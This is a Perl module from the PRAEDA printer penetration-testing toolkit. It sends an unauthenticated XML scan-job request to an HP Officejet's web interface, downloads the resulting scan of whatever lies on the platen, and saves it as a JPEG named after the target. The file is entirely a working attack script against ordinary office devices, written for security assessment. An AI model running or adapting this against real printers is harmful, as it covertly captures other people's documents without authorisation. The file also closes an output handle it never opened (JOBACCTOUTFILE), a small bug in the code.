# Officejet  Remote Scan
######################################################
#                    PRAEDA Module #MP0018           #
#        Copyright (C) 2012 Foofus.net		     #
#              Deral 'percX' Heiland                 #
######################################################
package MP0018;
sub MP0018
{
 
# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


#Open output file for loging 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
     print "\n**********Attempting Officejet Remote Scan  $TARGET : JOB MP0018**********\n";
     print OUTFILE "\n**********Attempting Officejet Remote Scan $TARGET : JOB MP0018**********\n";

# Send XLM request to trigger scan 
my $browser = LWP::UserAgent->new(timeout => 180);


my $message = '<scan:ScanJob xmlns:scan="http://www.hp.com/schemas/imaging/con/cnx/scan/2008/08/19" xmlns:dd="http://www.hp.com/schemas/imaging/con/dictionaries/1.0/"><scan:XResolution>300</scan:XResolution><scan:YResolution>300</scan:YResolution><scan:XStart>0</scan:XStart><scan:YStart>0</scan:YStart><scan:Width>2480</scan:Width><scan:Height>3508</scan:Height><scan:Format>Jpeg</scan:Format><scan:CompressionQFactor>25</scan:CompressionQFactor><scan:ColorSpace>Color</scan:ColorSpace><scan:BitDepth>8</scan:BitDepth><scan:InputSource>Platen</scan:InputSource><scan:AdfOptions>DetectPaperLoaded</scan:AdfOptions><scan:GrayRendering>NTSC</scan:GrayRendering><scan:ToneMap><scan:Gamma>0</scan:Gamma><scan:Brightness>1000</scan:Brightness><scan:Contrast>1000</scan:Contrast><scan:Highlite>0</scan:Highlite><scan:Shadow>0</scan:Shadow></scan:ToneMap><scan:ContentType>Photo</scan:ContentType></scan:ScanJob>';


# post XML request
my $response = $browser->post("http$web://$TARGET:$PORTS/Scan/Jobs", 
Content_Type => 'text/xml',
X-Requested-With => 'XMLHttpRequest',
Content => $message);

#debug
#print "debug-1\n";

my $location = $response->header("Location");
    @location = split /\//, $location;
    my $jpg = $location[5];
#print "$location\n";
#print "$jpg\n";
#print "$location[1] , $location[2] , $location[3] , $location[4] , $location[5]\n";


my $scanning = $browser->get("http$web://$TARGET:$PORTS/Scan/Jobs/$jpg/Pages/1");
open(JOBSCANOUTFILE, ">>./$OUTPUT/$TARGET-$PORTS-scan.jpg") || die("Failed to open  Output file $TARGET-$PORTS-scan.jpg \n");
print JOBSCANOUTFILE $scanning->content;
print "***********Officejet scan job $TARGET-$PORTS-scan.jpg **********\n";
print OUTFILE "**********Officejet scan job $TARGET-$PORTS-scan.jpg **********\n";

# operation completed close out output files
close(JOBACCTOUTFILE);

close(OUTFILE);
}
1;
